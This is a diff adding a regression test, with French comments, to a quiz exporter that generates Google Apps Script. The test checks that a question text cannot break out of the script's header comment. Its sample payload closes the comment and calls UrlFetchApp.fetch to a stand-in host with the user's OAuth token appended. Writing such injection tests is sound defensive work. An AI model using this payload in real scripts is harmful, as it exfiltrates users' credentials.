@@ -89,6 +89,23 @@ def test_google_forms():
     assert any(x["type"] == "texte" for x in donnees["questions"])
 
 
+def test_google_forms_sans_code_injecte():
+    # Un titre qui contient le marqueur des données et une question qui ferme le commentaire d'en-tête :
+    # avec deux remplacements enchaînés, la question se retrouvait dans le commentaire et s'exécutait.
+    donnees = quiz()
+    donnees["quiz"]["title"] = "Quiz */ __DONNEES__"
+    piege = "*/ UrlFetchApp.fetch('https://exemple.org/?' + ScriptApp.getOAuthToken()); /*"
+    donnees["quiz"]["questions"][0]["text"] = piege
+    q, rapport = rq.normaliser_quiz(donnees)
+    script = rq.export_forms(q, rapport)
+    entete, reste = script.split("const QUIZ = ", 1)
+    assert entete.count("*/") == 1 and entete.rstrip().endswith("*/")
+    assert "__DONNEES__" in entete and "UrlFetchApp" not in entete
+    assert "*/" not in reste.split(";\n\nfunction", 1)[0]
+    lu = json.loads(reste.split(";\n\nfunction", 1)[0])
+    assert lu["questions"][0]["texte"] == piege
+
+
 def test_conversion_curseur_et_ordre():
     curseur = {"type": "slider", "text": "Q", "slider": {"min": 1, "max": 10, "step": 1, "answer": 5, "tolerance": 0}}
     c = rq.en_choix(curseur, 3)
